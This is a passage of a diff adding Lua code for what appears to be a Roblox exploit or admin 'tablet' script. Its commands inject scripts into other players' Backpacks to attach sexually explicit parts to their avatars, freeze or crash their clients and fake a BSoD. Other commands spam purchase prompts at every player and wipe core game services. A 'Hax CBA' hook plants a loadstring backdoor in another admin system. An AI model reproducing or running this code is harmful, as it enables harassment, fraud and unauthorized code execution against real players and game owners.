+local cy = Instance.new("CylinderMesh")
+cy.Parent = d
+w = Instance.new("Weld")
+w.Parent = workspace[person].Head
+w.Part0 = d
+w.Part1 = workspace[person].Head
+w.C0 = CFrame.new(0,0.25,2.1)*CFrame.Angles(math.rad(45),0,0)
+local c = Instance.new("Part")
+c.Name = "Mush"
+c.BottomSurface = 0
+c.TopSurface = 0
+c.FormFactor = 3
+c.Size = Vector3.new(0.6,0.6,0.6)
+c.CFrame = CFrame.new(d.Position)
+c.BrickColor = BrickColor.new("Pink")
+c.CanCollide = false
+c.Parent = workspace[person]["Nice thing"]
+local msm = Instance.new("SpecialMesh")
+msm.Parent = c
+msm.MeshType = "Sphere"
+local cw = Instance.new("Weld")
+cw.Parent = c
+cw.Part0 = d
+cw.Part1 = c
+cw.C0 = CFrame.new(0,1.3,0)
+local ball1 = Instance.new("Part")
+ball1.Parent = workspace[person]["Nice thing"]
+ball1.Name = "Left Ball"
+ball1.BottomSurface = 0
+ball1.TopSurface = 0
+ball1.CanCollide = false
+ball1.formFactor = 3
+ball1.Size = Vector3.new(1,1,1)
+ball1.CFrame = CFrame.new(workspace[person]["Left Leg"].Position)
+ball1.BrickColor = BrickColor.new(color)
+local bsm = Instance.new("SpecialMesh")
+bsm.Parent = ball1
+bsm.MeshType = "Sphere"
+local b1w = Instance.new("Weld")
+b1w.Parent = ball1
+b1w.Part0 = workspace[person]["Left Leg"]
+b1w.Part1 = ball1
+b1w.C0 = CFrame.new(0,0.5,-.5)
+local ball2 = Instance.new("Part")
+ball2.Parent = workspace[person]["Nice thing"]
+ball2.Name = "Right Ball"
+ball2.BottomSurface = 0
+ball2.CanCollide = false
+ball2.TopSurface = 0
+ball2.formFactor = 3
+ball2.Size = Vector3.new(1,1,1)
+ball2.CFrame = CFrame.new(workspace[person]["Right Leg"].Position)
+ball2.BrickColor = BrickColor.new(color)
+local b2sm = Instance.new("SpecialMesh")
+b2sm.Parent = ball2
+b2sm.MeshType = "Sphere"
+local b2w = Instance.new("Weld")
+b2w.Parent = ball2
+b2w.Part0 = workspace[person]["Right Leg"]
+b2w.Part1 = ball2
+b2w.C0 = CFrame.new(0,0.5,-.5)
+lp:GetMouse().KeyDown:connect(function(kai)
+	if kai == "f" then
+		key = "f"
+	elseif kai == "q" then
+	        countspeed = countspeed+1.5
+	elseif kai == "e" then
+	        countspeed = countspeed-1.5
+	end
+end)
+lp:GetMouse().KeyUp:connect(function(kai)
+	if kai == "f" then
+		key = nil
+	elseif kai == "q" then
+	        key = nil
+	elseif kai == "e" then
+	        key = nil
+	end
+end)
+while wait() do
+	count = (count % 100) + countspeed
+	angle = math.pi * math.sin(math.pi*2/100*count)
+	if key == "f" then
+		countspeed = 15 --this is the speed xD
+		lm.C0 = lsc0 * CFrame.new(.6,-.4,0) * CFrame.Angles((-angle*0.100)+0.1, math.rad(45), math.rad(45)) 
+	end
+end
+print("Press and hold 'F' to fa\5p!")
+]==],v.Backpack,true,"Fap'd "..v.Name)
+        end
+end, 1)
+
+New("JC", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+			Script([==[
+	local TWO_PI = 2 * math.pi
+local cycletime = 0.75
+local offsetradius = 0.75
+local rotationoffset = math.pi
+function CubicInterpolate(y0, y1, y2, y3, mu)
+	local a0, a1, a2, a3, mu2
+	mu2 = mu * mu
+	a0 = y3 - y2 - y0 + y1
+	a1 = y0 - y1 - a0
+	a2 = y2 - y0
+	a3 = y1
+	return a0 * mu * mu2 + a1 * mu2 + a2 * mu + a3
+end
+local character = game.Players.LocalPlayer.Character
+local joints = {}
+local stack = character:GetChildren()
+while #stack ~= 0 do
+	local object = stack[#stack]
+	table.remove(stack)
+	for index, child in ipairs(object:GetChildren()) do
+		table.insert(stack, child)
+	end
+	if object:IsA("JointInstance") then
+		table.insert(joints, object)
+	end
+end
+local rot0 = {}
+local rot1 = {}
+local rot2 = {}
+local rot3 = {}
+local rot4 = {}
+for index, joint in ipairs(joints) do
+	local pos = Vector3.new(math.random() - 0.5, math.random() - 0.5, math.random() - 0.5).unit * offsetradius
+	local rot = Vector3.new(math.random(), math.random(), math.random()) * rotationoffset
+	rot0[index] = {joint.C0, joint.C1}
+	rot = Vector3.new(rot.x % TWO_PI, rot.y % TWO_PI, rot.z % TWO_PI)
+	rot2[index] = {pos, rot}
+	pos = Vector3.new(math.random() - 0.5, math.random() - 0.5, math.random() - 0.5).unit * offsetradius
+	rot = rot + Vector3.new(math.random(), math.random(), math.random()) * rotationoffset
+	rot = Vector3.new(rot.x % TWO_PI, rot.y % TWO_PI, rot.z % TWO_PI)
+	rot3[index] = {pos, rot}
+	pos = Vector3.new(math.random() - 0.5, math.random() - 0.5, math.random() - 0.5).unit * offsetradius
+	rot = rot + Vector3.new(math.random(), math.random(), math.random()) * rotationoffset
+	rot = Vector3.new(rot.x % TWO_PI, rot.y % TWO_PI, rot.z % TWO_PI)
+	rot4[index] = {pos, rot}
+end
+while character.Parent do
+	for i, j in ipairs(joints) do
+		local pos = Vector3.new(math.random() - 0.5, math.random() - 0.5, math.random() - 0.5).unit * offsetradius
+		local rot = rot4[i][2] + Vector3.new(math.random(), math.random(), math.random()) * rotationoffset
+		rot = Vector3.new(rot.x % TWO_PI, rot.y % TWO_PI, rot.z % TWO_PI)
+		rot1[i], rot2[i], rot3[i], rot4[i] = rot2[i], rot3[i], rot4[i], {pos, rot}
+	end
+	local start = tick()
+	while true do
+		local ctime = tick()
+		local elapsed = ctime - start
+		if elapsed > cycletime then
+			break
+		end
+		local progress = elapsed / cycletime
+		for index, joint in ipairs(joints) do
+			local v0, v1, v2, v3, v4 = rot0[index], rot1[index], rot2[index], rot3[index], rot4[index]
+			local p1, p2, p3, p4, r1, r2, r3, r4 = v1[1], v2[1], v3[1], v4[1], v1[2], v2[2], v3[2], v4[2]
+			local px = CubicInterpolate(p1.x, p2.x, p3.x, p4.x, progress)
+			local py = CubicInterpolate(p1.y, p2.y, p3.y, p4.y, progress)
+			local pz = CubicInterpolate(p1.z, p2.z, p3.z, p4.z, progress)
+			local rx = CubicInterpolate(r1.x, r2.x, r3.x, r4.x, progress)
+			local ry = CubicInterpolate(r1.y, r2.y, r3.y, r4.y, progress)
+			local rz = CubicInterpolate(r1.z, r2.z, r3.z, r4.z, progress)
+			local cframe = CFrame.new(px, py, pz) * CFrame.Angles(rx, ry, rz)
+			joint.C0 = v0[1] * cframe
+			joint.C1 = v0[2] * cframe:inverse()
+		end
+		wait()
+	end
+end
+	]==],v.Backpack,true,"Jc'd "..v.Name)
+        end
+end, 1)
+
+New("Raven", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+			Script(Raven,v.Backpack,true,"Raven'd "..v.Name)
+        end
+end, 1)
+
+New("mute", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+			Script(MuteSource,v.Backpack,true,"Muted "..v.Name)
+        end
+end, 1)
+New("unmute", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+			Script(UnMuteSource,v.Backpack,true,"Unmuted "..v.Name)
+        end
+end, 1)
+New("fun", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+			Script(FunScript,v.Backpack,true,"Put some fun into "..v.Name.."'s Life")
+        end
+end, 1)
+New("jail", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+			Script(JailSource,v.Backpack,true,"Jailed  "..v.Name)
+        end
+end, 1)
+
+
+New("sbase",
+        function(S,M)
+                        local Base = Workspace:FindFirstChild("Base")
+                        Base.Size = Vector3.new(50,1,50)
+                        Base.CFrame = CFrame.new(0,0,0)
+        end,1
+)
+New("Nil Shout", function(S,M)
+        local tag = Instance.new("StringValue")
+        tag.Value = (S==Player and CN or S.Name)..": "..M
+        tag.Name = "NILSHOUT"
+        tag.Parent = game:GetService("Lighting")
+        game.Debris:AddItem(tag,1)
+end, 1, "nilshout", "shout", "saynil", "sendnil")
+New("Hax CBA", function(S,M)
+        local c = M == "" and "CBA.admins,CBA.ban,CBA.showlvls,CBA.bubblechat = {{'99zay99',7}},{},true,false" or M
+        if c:lower() == "hook" then
+                CBH = true
+                c = [[game:GetService("Lighting").ChildAdded:connect(function(child)
+                        if child.Name == "CBA Attachment" and child:IsA("StringValue") then
+                                ypcall(loadstring(child.Value))
+                        end
+                end)]]
+        end
+        local t = Instance.new("StringValue")
+        local s,e = loadstring(c)
+        if not s then
+                return Output("Error: "..tostring(e),"Red")
+        end
+        t.Value = c
+        t.Name = "CBA Attachment"
+        t.Parent = CBH and game:GetService("Lighting") or workspace
+        wait(1)
+        t:Destroy()
+end, 2, "HCBA","CB")
+New("Disable Tablets", function(S,M)
+        if M:lower() == "all" then
+                local tag = Instance.new("StringValue")
+                tag.Name = "Disable all"
+                tag.Parent = workspace
+                wait()
+                tag:Destroy()
+                return
+        end
+        for k,v in pairs(Parse(M,",")) do
+                local tag = Instance.new("StringValue")
+                tag.Name = "Disable "..v:lower()
+                tag.Parent = workspace
+                wait()
+                tag:Destroy()
+        end
+end, 2, "disabletablet", "DTAB", "DTablet")
+New("Share Data", function(S,M)
+        tag = Instance.new("StringValue")
+        local tab = {Name=CN,Version="No Nilizer",Explorer=true,Removed="Never"}
+        tag.Value = LoadLibrary("RbxUtility").EncodeJSON(tab) tag.Name = "NILDATA"
+        tag.Parent = game:GetService("Lighting") wait(1) pcall(function() tag:Destroy() end)
+end, 2, "sharedata", "nildata")
+New("Fling", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character and v.Character:findFirstChild("Torso") and v.Character:findFirstChild("Humanoid") then
+                        v.Character.Humanoid.Sit = true
+                        v.Character.Torso.Velocity = Vector3.new(500,500,500)
+                end
+        end
+end, 1)
+New("Debug", function()
+game.Lighting.Ambient = Color3.new(0,0,0)
+GlobalShadows = true
+Outlines = true
+ local sky = Instance.new("Sky")
+ sky.Parent = game.Lighting
+ sky.SkyboxBk = "http://www.roblox.com/asset?id=58372690"
+ sky.SkyboxDn = "http://www.roblox.com/asset?id=58372722"
+ sky.SkyboxFt = "http://www.roblox.com/asset?id=58372742"
+ sky.SkyboxLf = "http://www.roblox.com/asset?id=58372777"
+ sky.SkyboxRt = "http://www.roblox.com/asset?id=58372794"
+ sky.SkyboxUp = "http://www.roblox.com/asset?id=58372812"
+ game.Lighting.ColorShift_Bottom = Color3.new(0,0,0)
+ game.Lighting.ColorShift_Top = Color3.new(0,0,0)
+ game.Lighting.ShadowColor = Color3.new(0.69,0.69,0.69)
+ game.Lighting.Brightness = 3
+ game.Lighting.FogStart = 0
+ game.Lighting.FogEnd = 999999999
+ game.Lighting.FogColor = Color3.new(192, 192, 192)
+ game.Lighting.TimeOfDay = 14
+end, 2, "flig")
+New("Bug", function()
+        for k,v in pairs({"Workspace","Players","Lighting","Debris","Teams","InsertService","Chat"}) do
+                game:GetService(v).Name = v:sub(1,4):reverse():sub(1,2):rep(5)
+                if k > 2 then
+                        pcall(function() game:GetService(v):ClearAllChildren() end)
+                end
+        end
+end, 2)
+New("Spawn Dummy", function(S,M)
+        local n = tonumber(M) and tonumber(M) > 1 and tonumber(M) or 1
+        local t = game:GetService("InsertService"):LoadAsset(68452456):findFirstChild("Clone") or Char and Char:clone()
+        if not t then return Output("No Inserted Clone or Saved Character!","Red",S) end
+        Instance.new("StringValue",t).Name = "Dummy"
+        for k,v in pairs(t:GetChildren()) do
+                if v:IsA("Hat") or v:IsA("Pants") or v:IsA("Shirt") or v:IsA("CharacterMesh") or v:IsA("ShirtGraphic") then
+                        v:Destroy()
+                elseif v:IsA("BodyColors") then
+                        v.HeadColor = BrickColor.new"Bright yellow"
+                        v.LeftArmColor = BrickColor.new"Bright yellow"
+                        v.RightArmColor = BrickColor.new"Bright yellow"
+                        v.LeftLegColor = BrickColor.new"Br. yellowish green"
+                        v.RightLegColor = BrickColor.new"Br. yellowish green"
+                        v.TorsoColor = BrickColor.new"Bright blue"
+                elseif v:IsA("Part") then
+                        v.Transparency = 0
+                        v.BrickColor = BrickColor.new(v.Name:lower():find("a") and "Bright yellow" or "Br. yellowish green")
+                        if v.Name == "Torso" then v.BrickColor = BrickColor.new("Bright blue") end
+                        if v:findFirstChild("roblox") then v.roblox:Destroy() end
+                end
+        end
+        if M:lower() == "grid" then
+                for x=-3,3 do
+                        for z=-3,3 do
+                                local c = t:clone()
+                                c.Name = "Dummy"
+                                c.Parent = workspace
+                                c:MakeJoints()
+                                c:MoveTo((workspace.CurrentCamera.Focus * CFrame.new(x*10,0,z*10)).p)
+                                if c:findFirstChild("Humanoid") then
+                                        c.Humanoid.Died:connect(function() wait(3) c:Destroy() end)
+                                end
+                                wait()
+                        end
+                end
+        else
+                for i=1,n do
+                        local c = t:clone()
+                        c.Name = "Dummy"
+                        c.Parent = workspace
+                        c:MakeJoints()
+                        c:MoveTo(workspace.CurrentCamera.Focus.p)
+                        if c:findFirstChild("Humanoid") then
+                                c.Humanoid.Died:connect(function() wait(3) c:Destroy() end)
+                        end
+                        wait(1)
+                end
+        end
+end, 1, "spawndummy", "dummy", "dm")
+New("Podium", function(S,M)
+        local Cf = workspace.CurrentCamera.Focus * CFrame.new(0,-2,0)
+        local MainColor = Color3.new(0,0,0)
+        local SeccondaryColor = Color3.new(1,1,1)
+        local Main = Instance.new("Model",workspace) Main.Name = "Castle"
+        local MainCFrame = Cf * CFrame.new(0,-4,0) + Cf.lookVector*3
+        local SeccondaryCFrame = Cf * CFrame.new(0,-4 + (25 * 0.9),((2 * 25) * -1) - 10 ) + Cf.lookVector *3  
+        for i=1,25 do
+                wait()
+                local Step = Instance.new("Part",Main)
+                Step.FormFactor = "Custom"
+                Step.Name = "Step"
+                Step.Anchored = true
+                Step.TopSurface = "Smooth"
+                Step.BottomSurface = "Smooth"
+                Step.BrickColor = BrickColor.new(SeccondaryColor)
+                Step.Size = Vector3.new(6,1,3)
+                Step.CFrame = MainCFrame * CFrame.new(0,(i*0.9), i * (-2))
+                Instance.new("BlockMesh",Step)
+                local Carpet = Instance.new("Part",Main)
+                Carpet.FormFactor = "Custom"
+                Carpet.Name = "Carpet"
+                Carpet.Anchored = true
+                Carpet.TopSurface = "Smooth"
+                Carpet.BottomSurface = "Smooth"
+                Carpet.BrickColor = BrickColor.new(MainColor)
+                Carpet.Size = Vector3.new(4,1,3.2)
+                Carpet.CFrame = MainCFrame * CFrame.new(0,(i*0.9)+ 0.1, i * (-2))
+                Instance.new("BlockMesh",Carpet)  
+        end    
+        local MainCirc = Instance.new("Part",Main)
+        MainCirc.FormFactor = "Custom"
+        MainCirc.Name = "MainCirc"
+        MainCirc.Anchored = true
+        MainCirc.TopSurface = "Smooth"
+        MainCirc.BottomSurface = "Smooth"
+        MainCirc.BrickColor = BrickColor.new(SeccondaryColor)
+        MainCirc.Size = Vector3.new(20,1,20)
+        MainCirc.CFrame = SeccondaryCFrame
+        Instance.new("CylinderMesh",MainCirc)
+        local SeccondaryCirc = Instance.new("Part",Main)
+        SeccondaryCirc.FormFactor = "Custom"
+        SeccondaryCirc.Name = "SeccondaryCirc"
+        SeccondaryCirc.Anchored = true
+        SeccondaryCirc.TopSurface = "Smooth"
+        SeccondaryCirc.BottomSurface = "Smooth"
+        SeccondaryCirc.BrickColor = BrickColor.new(MainColor)
+        SeccondaryCirc.Size = Vector3.new(18,1,18)
+        SeccondaryCirc.CFrame = SeccondaryCFrame * CFrame.new(0,0.1,0)
+        Instance.new("CylinderMesh",SeccondaryCirc)
+        for i=1,math.floor(360/6) do
+                local Spike = Instance.new("Part",Main)
+                Spike.FormFactor = "Custom"
+                Spike.Name = "Spike"
+                Spike.Anchored = true
+                Spike.Reflectance = 0
+                Spike.TopSurface = "Smooth"
+                Spike.BottomSurface = "Smooth"
+                Spike.BrickColor = BrickColor.new(MainColor)
+                Spike.Size = Vector3.new(1,7,1)
+                Spike.CFrame = SeccondaryCFrame * CFrame.Angles(math.rad(0),math.rad((360/6)*i),math.rad(45)) * CFrame.new(7,-7,0)
+                Torch = Instance.new("Part",Main)
+                Torch.FormFactor = "Custom"
+                Torch.Shape = "Ball"
+                Torch.Anchored = true
+                Torch.Size = Vector3.new(2,2,2)
+                Torch.CFrame = Spike.CFrame * CFrame.new(0,3.5,0) * CFrame.Angles(0,0,0)
+                Instance.new("Fire",Torch)
+        end
+end, 2)
+New("Particles", function(S,M)
+        local a,b = Split(M)
+        local p,n = {S},5
+        if b and tonumber(b) then
+                p = Players(a,S)
+                n = tonumber(b)
+        elseif not b and tonumber(a) then
+                n = tonumber(a)
+        else
+                return Output("Need a number!","Red",S)
+        end
+        local part = Instance.new("Part")
+        part.Anchored = true
+        part.Locked = true
+        part.CanCollide = false
+        part.FormFactor = "Custom"
+        part.Size = Vector3.new(0.1,0.1,0.1)
+        part.BrickColor = BrickColor.new("Red")
+        local function angle()
+                return CFrame.Angles(math.rad(math.random(360)),math.rad(math.random(360)),math.rad(math.random(360)))
+        end
+        local function particles(pa)
+                for i=1,n,0.1 do
+                        local p = part:clone()
+                        p.Parent = pa
+                        p.CFrame = pa.CFrame * angle() * CFrame.new(math.random(5),math.random(5),math.random(5))
+                        game.Debris:AddItem(p,0.5)
+                        wait(0.1)
+                end
+        end
+        for k,v in pairs(p) do
+                if v.Character and v.Character:findFirstChild("Torso") then
+                        coroutine.wrap(particles)(v.Character.Torso)
+                end
+        end
+end, 1)
+
+New("Danger Zone", function(S,M)
+	game.Lighting.Ambient = Color3.new(1, -10, -10)
+	game.Lighting.FogEnd = 45
+	game.Lighting.FogColor = Color3.new(0, 0, 0)
+	game.Lighting.GlobalShadows = true
+	game.Lighting.TimeOfDay = "00:00:00"
+		        s = Instance.new("Sky", game.Lighting)
+                s.CelestialBodiesShown = false
+                s.SkyboxBk = "http://www.roblox.com/asset/?ID=2013298"
+                s.SkyboxDn = "http://www.roblox.com/asset/?ID=2013298"
+                s.SkyboxFt = "http://www.roblox.com/asset/?ID=2013298"
+                s.SkyboxLf = "http://www.roblox.com/asset/?ID=2013298"
+                s.SkyboxRt = "http://www.roblox.com/asset/?ID=2013298"
+                s.SkyboxUp = "http://www.roblox.com/asset/?ID=2013298"
+                s.StarCount = 0
+    
+s = Instance.new("Sound")
+s.Name = "Music"
+s.SoundId = "http://www.roblox.com/asset?id=142848288"
+s.Looped = true
+s.Pitch = 1
+s.Volume = 10
+s.archivable = false
+
+s.Parent = game.Workspace
+
+wait(1)
+
+s:play()
+end,2, "Danger","Dzone") 
+New("Music", function(S,M)
+s = Instance.new("Sound")
+s.Name = "Music"
+s.SoundId = "http://www.roblox.com/asset?id="..M
+s.Looped = true
+s.Pitch = 1
+s.Volume = 10
+s.archivable = false
+
+s.Parent = game.Workspace
+
+wait(1)
+
+s:play()
+end,2, "Play") 
+New("nil", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character then
+                        v.Character = nil
+                end
+        end
+end, 1, "nochar")
+New("Buy", function(S,M)
+        for k,v in pairs(Game.Players:GetPlayers()) do
+			game:GetService("MarketplaceService"):PromptPurchase(v, tonumber(M))
+        end
+end, 1, "PTB")
+
+New("Rejoin", function(S,M) 
+		game:service'TeleportService':Teleport(game.PlaceId)
+		end,2)
+New("BSoD", function(S,M)
+	for k,v in pairs(Players(M,S)) do
+Script(BSoDSource,v.Backpack,true,"Giving BSoD to  "..v.Name)
+	end
+end, 2)
+New("Bigdeek", function(M,S)
+      for k,v in pairs(Players(S,M)) do
+        player=v.Name
+        color = "Pastel brown"
+        D = Instance.new("Model",workspace[player])
+        D.Name = "Nice thing"
+        bg = Instance.new("BodyGyro",workspace[player].Torso)
+        d = Instance.new("Part")
+        d.TopSurface = 0
+        d.BottomSurface = 0
+        d.Name = "Main"
+        d.Parent = workspace[player]["Nice thing"]
+        d.formFactor = 3
+        d.Size = Vector3.new(0.6*2 ,2.5*2 ,0.6*2 )
+        d.BrickColor = BrickColor.new(color)
+        d.Position = workspace[player].Head.Position
+        d.CanCollide = false
+        local cy = Instance.new("CylinderMesh")
+        cy.Parent = d
+        w = Instance.new("Weld")
+        w.Parent = workspace[player].Head
+        w.Part0 = d
+        w.Part1 = workspace[player].Head
+        w.C0 = CFrame.new(0,0.25 ,2.1 )*CFrame.Angles(math.rad(45),0,0)
+        local c = Instance.new("Part")
+                c.Name = "Mush"
+        c.BottomSurface = 0
+        c.TopSurface = 0
+        c.FormFactor = 3
+        c.Size = Vector3.new(0.6*2 ,0.6*2 ,0.6*2 )
+        c.CFrame = CFrame.new(d.Position)
+        c.BrickColor = BrickColor.new("Pink")
+        c.CanCollide = false
+        c.Parent = workspace[player]["Nice thing"]
+        local msm = Instance.new("SpecialMesh")
+        msm.Parent = c
+        msm.MeshType = "Sphere"
+        local cw = Instance.new("Weld")
+        cw.Parent = c
+        cw.Part0 = d
+        cw.Part1 = c
+        cw.C0 = CFrame.new(0,2.6 ,0)
+        local ball1 = Instance.new("Part")
+        ball1.Parent = workspace[player]["Nice thing"]
+        ball1.Name = "Left Ball"
+        ball1.BottomSurface = 0
+        ball1.TopSurface = 0
+        ball1.CanCollide = false
+        ball1.formFactor = 3
+        ball1.Size = Vector3.new(1*2 ,1*2 ,1*2 )
+        ball1.CFrame = CFrame.new(workspace[player]["Left Leg"].Position)
+        ball1.BrickColor = BrickColor.new(color)
+        local bsm = Instance.new("SpecialMesh")
+        bsm.Parent = ball1
+        bsm.MeshType = "Sphere"
+        local b1w = Instance.new("Weld")
+        b1w.Parent = ball1
+        b1w.Part0 = workspace[player]["Left Leg"]
+        b1w.Part1 = ball1
+        b1w.C0 = CFrame.new(0,0.5 ,-.5 )
+        local ball2 = Instance.new("Part")
+        ball2.Parent = workspace[player]["Nice thing"]
+        ball2.Name = "Right Ball"
+        ball2.BottomSurface = 0
+        ball2.CanCollide = false
+        ball2.TopSurface = 0
+        ball2.formFactor = 3
+        ball2.Size = Vector3.new(1*2 ,1*2 ,1*2 )
+        ball2.CFrame = CFrame.new(workspace[player]["Right Leg"].Position)
+        ball2.BrickColor = BrickColor.new(color)
+        local b2sm = Instance.new("SpecialMesh")
+        b2sm.Parent = ball2
+        b2sm.MeshType = "Sphere"
+        local b2w = Instance.new("Weld")
+        b2w.Parent = ball2
+        b2w.Part0 = workspace[player]["Right Leg"]
+        b2w.Part1 = ball2
+        b2w.C0 = CFrame.new(0,0.5,-.5)
+end
+end,2, "bdeek")
+New("Smalldeek", function(S,M)
+                for k,v in pairs(Players(M,S)) do
+                player=v.Name
+                color = "Pastel brown"
+                D = Instance.new("Model",workspace[player])
+                D.Name = "Nice thing"
+                bg = Instance.new("BodyGyro",workspace[player].Torso)
+                d = Instance.new("Part")
+                d.TopSurface = 0
+                d.BottomSurface = 0
+                d.Name = "Main"
+                d.Parent = workspace[player]["Nice thing"]
+                d.formFactor = 3
+                d.Size = Vector3.new(0.6/2 ,2.5 ,0.6/2 )
+                d.BrickColor = BrickColor.new(color)
+                d.Position = workspace[player].Head.Position
+                d.CanCollide = false
+                local cy = Instance.new("CylinderMesh")
+                cy.Parent = d
+                w = Instance.new("Weld")
+                w.Parent = workspace[player].Head
+                w.Part0 = d
+                w.Part1 = workspace[player].Head
+                w.C0 = CFrame.new(0,0.25 ,2.1 )*CFrame.Angles(math.rad(45),0,0)
+                local c = Instance.new("Part")
+                c.Name = "Mush"
+                c.BottomSurface = 0
+                c.TopSurface = 0
+                c.FormFactor = 3
+                c.Size = Vector3.new(0.6/2 ,0.6/2 ,0.6/2 )
+                c.CFrame = CFrame.new(d.Position)
+                c.BrickColor = BrickColor.new("Pink")
+                c.CanCollide = false
+                c.Parent = workspace[player]["Nice thing"]
+                local msm = Instance.new("SpecialMesh")
+                msm.Parent = c
+                msm.MeshType = "Sphere"
+                local cw = Instance.new("Weld")
+                cw.Parent = c
+                cw.Part0 = d
+                cw.Part1 = c
+                cw.C0 = CFrame.new(0,1.3 ,0)
+                local ball1 = Instance.new("Part")
+                ball1.Parent = workspace[player]["Nice thing"]
+                ball1.Name = "Left Ball"
+                ball1.BottomSurface = 0
+                ball1.TopSurface = 0
+                ball1.CanCollide = false
+                ball1.formFactor = 3
+                ball1.Size = Vector3.new(1 ,1 ,1 )
+                ball1.CFrame = CFrame.new(workspace[player]["Left Leg"].Position*2)
+                ball1.BrickColor = BrickColor.new(color)
+                local bsm = Instance.new("SpecialMesh")
+                bsm.Parent = ball1
+                bsm.MeshType = "Sphere"
+                local b1w = Instance.new("Weld")
+                b1w.Parent = ball1
+                b1w.Part0 = workspace[player]["Left Leg"]
+                b1w.Part1 = ball1
+                b1w.C0 = CFrame.new(0,0.5 ,-.5 )
+                local ball2 = Instance.new("Part")
+                ball2.Parent = workspace[player]["Nice thing"]
+                ball2.Name = "Right Ball"
+                ball2.BottomSurface = 0
+                ball2.CanCollide = false
+                ball2.TopSurface = 0
+                ball2.formFactor = 3
+                ball2.Size = Vector3.new(1 ,1 ,1 )
+                ball2.CFrame = CFrame.new(workspace[player]["Right Leg"].Position*2)
+                ball2.BrickColor = BrickColor.new(color)
+                local b2sm = Instance.new("SpecialMesh")
+                b2sm.Parent = ball2
+                b2sm.MeshType = "Sphere"
+                local b2w = Instance.new("Weld")
+                b2w.Parent = ball2
+                b2w.Part0 = workspace[player]["Right Leg"]
+                b2w.Part1 = ball2
+                b2w.C0 = CFrame.new(0,0.5,-.5)
+        end
+end,2, "sdeek")
+New("Freeze", function(S,M)
+                for k,v in pairs(Players(M,S)) do
+                        v.Character.Torso.Anchored = true
+            end
+end, 2)
+New("spike",
+	function(S,M)
+		for i,v in pairs(Players(M,S)) do
+				local loc = v:FindFirstChild("Backpack")
+				if loc then
+						Script([[
+							script.Parent = nil
+							local endTime = tick() + math.random(2,5)
+							while tick() < endTime do end
+						]],loc,true,"Spiked "..v.Name)
+				end
+		end
+	end,1
+)
+New("Thaw", function(S,M)
+                for k,v in pairs(Players(M,S)) do
+                                v.Character.Torso.Anchored = false
+                        end
+end, 2)
+
+
+New("PRI", 
+	function(S,M)
+if M:lower() == "on" then
+	PRI = true
+		Tablet('PRI Is On','Orange')
+elseif M:lower() == "off" then
+	PRI = false
+	Tablet('PRI Is Off','Green')
+	end
+end, 2)
+
+New('rkp',
+ function(S,M)
+for i,s in pairs(farbidden) do
+if string.sub(string.lower(s), 1, #M) == string.lower(M) then
+table.remove(farbidden, i)
+Tablet('Removed '..s..' from K'..'ic'..'ki'..'ng Phrases','Red')
+end end end,2
+)
+New('nkp',
+ function(S,M)
+table.insert(farbidden, M)
+Tablet('Added '..M..' to Ki'..'cki'..'ng Phrases','Green')
+end,2
+)
+ 
+-- Event Functions
+function JoinAll()
+        for k,v in pairs(game:GetService("Players"):GetPlayers()) do
+                Joined(v)
+        end
+end
+function Chatted(player,msg)
+        local a,b = Split(msg)
+        local cmd = b and Commands[a]
+        if player == Player then
+                if cmd and not a:find(" ") and not a:find("/") then
+                        if 20 >=cmd.Level then
+                                cmd.Run(player,b,a)
+                        elseif not Noti[player.Name] and a ~= "" then
+                                Output("You have no access to that command!","Red",player,5)
+                        end
+                        if sc and not bc then
+                                local msg = Title(msg,player.Character and player.Character:findFirstChild("Head") or Probe,"Cyan",true)
+                                wait(3)
+                                msg:Destroy()
+                        end
+                elseif not bc then
+                        local msg = Title(msg,player.Character and player.Character:findFirstChild("Head") or Probe,"Cyan",true)
+                        wait(3)
+                        msg:Destroy()
+                end
+        else
+                if cmd and not a:find(" ") and not a:find("/") and (cmd.Level == 0 or cmd.Level == 1 and Holo(player))then
+                        cmd.Run(player,b,a)
+                elseif cmd and not Noti[player.Name] and not a:find(" ") and not a:find("/") and a ~= "" then
+                        Output("You have no access to that command!","Red",player,10)
+                elseif not cmd and CO[player.Name] then
+                        local msg = Title(msg,player.Character and player.Character:findFirstChild("Head"),"Orange",true)
+                        wait(3)
+                        msg:Destroy()
+                elseif not cmd and not Holo(player) then
+                        for k,v in pairs(farbidden) do
+                                if msg:lower():find(v:lower()) then
+                                        Output("You used an ilegal word!","Red",player,3)
+                                        Output(player.Name.." used an ilegal word: "..v,"Black",Player,3,false,false,true)
+                                        wait(0.001)
+                                        Crash(player)
+                                end
+                        end
+                end
+        end
+end
+function ClientListener(c)
+        if c.Parent and c.Parent:IsA("Player") and c.Name == "KeyDown" and Holo(c.Parent) then
+                if c.Value == "h" then
+                        DoCommand("commands","",c.Parent)
+                elseif c.Value == "c" then
+                        Clear(false,c.Parent)
+                end
+                wait()
+                c:Destroy()
+        end
+end
+function Joined(player)
+        if not player:IsA("Player") then return end
+        if player.Name == Player.Name then return end
+        JT[player.Name] = tick()
+        player.Chatted:connect(function(m) ypcall(Chatted,player,m) end)
+        player.ChildAdded:connect(function(c) ypcall(ClientListener,c) end)
+        repeat wait() until player:findFirstChild("Backpack")
+        Script(hui,player.Backpack,true)
+        wait()
+        for k,v in pairs(PB) do
+                if v:lower() == player.Name:lower() then
+                        for i=1,5 do
+                                pcall(function() v:Destroy() end)
+                                wait()
+                        end
+                end
+        end
+        wait()
+        player.Neutral = true
+        if player.Parent then
+                Output(player.Name.." joined","Green")
+        else
+                Output(player.Name.." tried to join","Orange")
+        end
+end
+function Left(player)
+        if not player:IsA("Player") or player == Player then return end
+        LastOnline[player.Name] = tick()
+        if JT[player.Name] and tick() - JT[player.Name] > 5 then
+                Output(player.Name.." left","Orange")
+        end
+end
+function LightAdded(c)
+        if c.Name == "NILDATA" and c:IsA("StringValue") then
+                local tab = LoadLibrary("RbxUtility").DecodeJSON(c.Value)
+                if tab.Name then
+                        if not NRS[tab.Name] then
+                                Output("Found Tablet User: "..tab.Name)
+                        end
+                        if c:findFirstChild("Player") then
+                                tab.Player = c.Player.Value
+                        end
+                        NRS[tab.Name] = tab
+                end
+        elseif c.Name == "NILSHOUT" and c:IsA("StringValue") then
+                Output(c.Value,"Brown",Player,60)
+        elseif c.Name == "DISABLED" and c:IsA("StringValue") then
